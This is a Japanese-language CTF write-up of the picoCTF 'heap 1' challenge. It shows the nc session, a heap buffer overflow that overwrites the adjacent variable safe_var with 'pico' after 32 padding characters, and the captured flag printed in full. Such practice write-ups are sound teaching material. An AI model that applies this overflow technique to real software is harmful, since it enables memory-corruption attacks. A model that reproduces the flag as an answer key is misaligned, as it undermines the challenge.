# heap 1:Binary Exploitation

Can you control your overflow? Download the binary here. Download the source here. Connect with the challenge instance here: nc tethys.picoctf.net 50975

attachment
chall
chall.c

heap0とほぼ同じだと推察できるので、とりあえず、`nc tethys.picoctf.net 50975`を実行してみる。
```
$ nc tethys.picoctf.net 50975

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x571a3a5852b0  ->   pico
+-------------+----------------+
[*]   0x571a3a5852d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4
Looks like everything is still secure!

No flage for you :(
```
選択肢で2を選んで、とりあえずオーバーフローを試みると、案の定`safe_var`が書き換わった。
```
Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x61019f5702b0  ->   abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
+-------------+----------------+
[*]   0x61019f5702d0  ->   ghijklmnopqrstuvwxyz
+-------------+----------------+
```
ソースコードを見てみると、`!strcmp(safe_var, "pico")`という記述があったsafe_varとpicoを比較して一致すればフラグが得られるようになっているらしい。safe_varは32文字を超えて入力した文字に書き換わるようなので`何らかの文字列(32文字)+pico`を入力すればsafe_varがpicoに書き換わり、フラグが得られるはずだ。

```
Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyzabcdefpico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x61019f5702b0  ->   abcdefghijklmnopqrstuvwxyzabcdefpico
+-------------+----------------+
[*]   0x61019f5702d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_ce5bee9b}
```
フラグが得られた。

`picoCTF{starting_to_get_the_hang_ce5bee9b}`

